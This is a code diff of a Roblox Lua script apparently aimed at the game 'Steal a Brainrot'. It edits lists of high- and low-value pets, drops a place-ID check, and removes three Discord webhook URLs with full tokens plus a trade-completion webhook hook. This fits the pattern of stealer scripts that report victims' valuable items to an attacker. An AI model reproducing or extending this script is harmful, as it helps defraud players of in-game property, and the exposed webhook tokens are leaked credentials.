@@ -3,12 +3,6 @@ task.spawn(function()
         game.Loaded:Wait()
     end
 
-    local allowedPlaces = { 99606176102979, 109983668079237 }
-    if not table.find(allowedPlaces, game.PlaceId) then
-        return
-    end
-
-    task.spawn(function()
         ----------------------------------------------------------------
         -- Services
         ----------------------------------------------------------------
@@ -35,58 +29,45 @@ task.spawn(function()
 
         local ALLOWED_ANIMALS = {
             "Dragon Gingerini",
-            "Noobini Pizzanini",
-            "Hydra Dragon Cannelloni",
+            "Ketcharu And Mustaru",
+            "Money Money Puggy",
             "Antonio",
             "Elefanto Frigo",
             "Griffin",
             "Skibidi Toilet",
             "Meowl",
             "Strawberry Elephant",
-            "Headless Horseman",
-            "Dragon Cannelloni",
-            "Signore Carapace",
+            "Lovin Rose",
+            "La Lucky Grande",
+            "Capitano Moby",
             "Celestial Pegasus",
             "Buguro And Fryuro",
         }
+
         local ALLOWED_ANIMALS_SET = {}
         for _, name in ipairs(ALLOWED_ANIMALS) do
             ALLOWED_ANIMALS_SET[name] = true
         end
 
-        local GOOD_WEBHOOK = "https://discord.com/api/webhooks/1505369576131526857/vTk5Ohn9tVN9SMg07Zd3QvkG0Had_O5EZDmQp7UFYZTd059qMFxyXMbNXmDRBU_7IGJR"
-        local GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
-        local BAD_WEBHOOK = "https://discord.com/api/webhooks/1505369670339793086/Ty1gCtyBGkMVuKadcuALuVFfchMmSG5DZc9Q1etwSJOL9mc1yKAVh15dHWnA91G7tKIE"
-        local BAD_AVATAR = "https://cdn.pfps.gg/pfps/35122-skeleton.jpeg"
-        local TRADE_WEBHOOK = "https://discord.com/api/webhooks/1503483394233995446/EMvHZz1SrISsD6jTWjyX2TDMh1O6PMv39HgzHpcaohZSd5u0MP1-zPL-sVZpm1VypeIl"
-        local TRADE_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
-
-        local lastOfferedList = {}
-        local sendTradeCompleteWebhook
-
-        local FANDOM_BASE = "https://stealabrainrot.fandom.com/wiki/"
 
         local GOOD_BRAINROTS = {
             ["Dragon Gingerini"] = true,
-            ["Hydra Dragon Cannelloni"] = true,
-            ["Antonio"] = true,
-            ["Elefanto Frigo"] = true,
+            ["Money Money Puggy"] = true,
             ["Griffin"] = true,
             ["Skibidi Toilet"] = true,
             ["Meowl"] = true,
-            ["Strawberry Elephant"] = true,
-            ["Headless Horseman"] = true,
-            ["Dragon Cannelloni"] = true,
-            ["Signore Carapace"] = true,
+            ["Ketcharu And Mustaru"] = true,
+            ["Lovin Rose"] = true,
+            ["La Lucky Grande"] = true,
+            ["Capitano Moby"] = true,
             ["Celestial Pegasus"] = true,
             ["Buguro And Fryuro"] = true,
         }
 
         local BAD_BRAINROTS = {
-            ["Ketchuru and Musturu"] = true,
+
             ["Garama and Madundung"] = true,
             ["Cerberus"] = true,
-            ["Capitano Moby"] = true,
             ["Ketupat Kepat"] = true,
             ["Tictac Sahur"] = true,
             ["Los Hotspotsitos"] = true,
@@ -98,7 +79,6 @@ task.spawn(function()
             ["Los Puggies"] = true,
             ["Eviledon"] = true,
             ["Los Tacoritas"] = true,
-            ["Lovin Rose"] = true,
             ["Dug dug dug"] = true,
             ["La Taco Combinasion"] = true,
             ["Festive 67"] = true,
